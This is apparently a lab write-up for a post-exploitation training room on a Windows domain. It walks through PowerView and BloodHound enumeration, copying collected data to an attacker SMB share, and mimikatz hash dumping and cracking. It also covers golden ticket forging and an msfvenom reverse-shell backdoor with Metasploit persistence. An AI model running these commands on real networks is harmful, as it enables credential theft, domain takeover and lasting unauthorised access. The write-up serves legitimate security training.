## Post-Exploitation Basics

Learn the basics of post-exploitation and maintaining access with mimikatz, bloodhound, powerview and msfvenom

## Task 01: Introduction

This room will be related to very real world applications and will most likely not help with any ctfs however this room will give you great starting knowledge of how to approach a network after you have gained a shell on a machine.

## Task 02: Enumeration w/ Powerview

Powerview is a powerful powershell script from powershell empire that can be used for enumerating a domain after you have already gained a shell in the system.

* Start Powershell - `powershell -ep bypass` -ep bypasses the execution policy of powershell allowing you to easily run scripts
* Start PowerView - `. .\PowerView.ps1` #assuming you're in the powerview directory.
* Enumerate the domain users - `Get-NetUser | select cn`
* Enumerate the domain groups - `Get-NetGroup -GroupName *admin*`

Here's a cheatsheet to help you with commands: [https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

### 2.1

What is the shared folder that is not set by default?

*  `Invoke-ShareFinder`
  ![powerview-share](https://i.imgur.com/QaLVmv2.png)

### 2.2

What operating system is running inside of the network besides Windows Server 2019?

* `Get-NetComputer -fulldata | select operatingsystem`
  ![img](https://i.imgur.com/gHCcbNt.png)

### 2.3

I've hidden a flag inside of the users find it. 

* `Get-NetUser | select cn`
  as hint suggest, we needed to look into users using `powerview`.

## Task 03: Enumeration w/ Bloodhound

It should be obvious, but the BloodHound installation is on your attacking machine. Once you've installed it, you start neo4j on the attacker machine and then use the web interface to set your new password. Neo4j is the graph database that BloodHound uses. More at https://neo4j.com/.

 
The questions in this section can all be answered using the correct reports from within BloodHound. Note that like the Task mentioned, I was unable to load the zip archive from the upload button - I had to drag it onto the BloodHound canvas. Also, neo4j must be running for BloodHound to work.

* install Bloodhount & use `sharphound` to get the data out. use `impacket-smbserver` to start a share drive to copy `zip` file.
* BloodHound Installation
  * `apt-get install bloodhound`
  * `neo4j console` - default credentials -> neo4j:neo4j #please change it
* Getting loot w/ SharpHound -
  * `powershell -ep bypass`
  * `. .\SharpHound.ps1 #assusming you're in same dir`
  * `Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip` collect the logs.
* SMB server CMD
  
  ```bash
  impacket-smbserver pe $(pwd)  -smb2support -username admin -password admin
  # pe is the share name
  # in target (windows) run \\ip\pe enter creds as admin:admin to auth. 
  ```

* now you have all files and data, import the zip file in `bloodhount` and let's get enumerating.

### 3.1

What service is also a domain admin

run list all service accounts. it will return one service accout.

### 3.2

What two users are Kerberoastable?

run `List all Kerberoastable Accounts` to get 2 accounts.
hint start with `S*********` account then `K*****`

## Task 04: Dumping hashes w/ mimikatz

* Dump Hashes w/ mimikatz -
  * `mimikatz.exe` to start the mimikatz
  * `privilege::debug` ensure that the output is "Privilege '20' ok" - This ensures that you're running mimikatz as an administrator; if you don't run mimikatz as an administrator, mimikatz will not run properly
  * `lsadump::lsa /patch` Dump those hashes!
* Crack those hashes w/ hashcat
  * `hashcat -m 1000 <hashFile> rockyou.txt` #rockyou usually found on `/usr/share/wordlists/rockyou.txt`

* running `mimikatz`
  ![mimikatz](https://i.imgur.com/rkbUcba.png)

* Cracking the hashes
  
```zsh
     hashcat -m 1000 --force --username hash.txt /usr/share/wordlists/rockyou.txt
```

* -m 1000 = hash type, in this case 1000 specifies a NTLM hash type
* --force = ignore warnings
* --show = compares hashlist with potfile; show cracked hashes
* --username = enables ignoring of usernames in hashfile
* hash.txt = our file with the username:hash information
* rockyou.txt = our word list with the passwords.

* view the password
  
  ```bash
  hashcat --show hash.txt
  ```

### 4.1

what is the Machine1 Password?

> ans can be found using the cracking

### 4.2

What is the Machine2 Hash?

> ans can be found using `lsadump::lsa /patch`

## Task 05: Golden Ticket Attacks w/ mimikatz

* Dump the krbtgt Hash -
  * `mimikatz.exe` run the mimikatz
  * `privilege::debug` ensure this outputs [privilege "20" ok]
  * `lsadump::lsa /inject /name:krbtgt` This dumps the hash and security identifier of the Kerberos Ticket Granting Ticket account allowing you to create a golden ticket

  ![img](https://i.imgur.com/Yzq71aI.png)

* Create a Golden Ticket -
   `kerberos::golden /user: /domain: /sid: /krbtgt: /id:` #inside mimikatz
    ![img](https://i.imgur.com/9ZIN20L.png)
  
* Use the Golden Ticket to access other machine -
  * `misc::cmd` - This will open a new command prompt with elevated privileges to all machines

     ![img](https://i.imgur.com/iB0Io20.png)
  * Access other Machines! - You will now have another command prompt with access to all other machines on the network

## Task 06: Enumeration w/ Server Manager

### 6.1

What tool allows to view the event logs?

`eventvwr.exe` ceck the "Application Name"

### 6.2

What is the SQL Service password

`net user sqlservice` reveals the Password in description.

---

## Task 07:  Maintaining Access

1. Generating a Payload w/ msfvenom
   1. `msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe`
      1.  `p` : Payload, here we're using windows based meterpreter
      2.  `LHOST`: local IP addrress, where we will be receiving the backdoor access.
      3.  `LPORT`: the port number
      4.  `f` : format of the exe file.
      5.  `o` : output file name and location.

**Read this post for more details: [msf-run](https://classroom.anir0y.in/post/msf-runscript/)**

2. Run the Persistence Module -
   1. `use exploit/windows/local/persistence`
   2. set `session 1` set the session to the session that we backgrounded in meterpreter (you can use the `sessions` command in metasploit to list the active sessions)
   3. `run` it!
